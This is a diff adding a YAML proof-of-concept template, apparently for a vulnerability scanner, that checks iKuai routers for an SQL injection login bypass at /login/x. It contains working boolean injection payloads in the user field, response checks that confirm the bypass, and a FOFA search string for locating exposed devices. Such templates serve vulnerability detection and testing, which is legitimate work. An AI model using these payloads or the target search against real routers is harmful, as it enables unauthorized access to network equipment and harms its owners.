@@ -1,0 +1,29 @@
+id: poc-yaml-ikuai-login-x-sqli-bypass
+info:
+  name: iKuai 爱快流控路由器 /login/x SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 爱快流控路由器
+  fofa: title="登录爱快流控路由"
+requests:
+- method: POST
+  path: /login/x
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'user="+or+1%3d0+or+""%3d"&pass=1
+
+    '
+  expression: "status_code == 200 && \ncontains(find_json(body,\"recode\"), \"1\"\
+    ) \n"
+- method: POST
+  path: /login/x
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'user="+or+1%3d1+or+""%3d"&pass=1
+
+    '
+  expression: "status_code == 200 && \ncontains(find_json(body,\"recode\"), \"0\"\
+    )\n"
+variables: {}
+transport: http
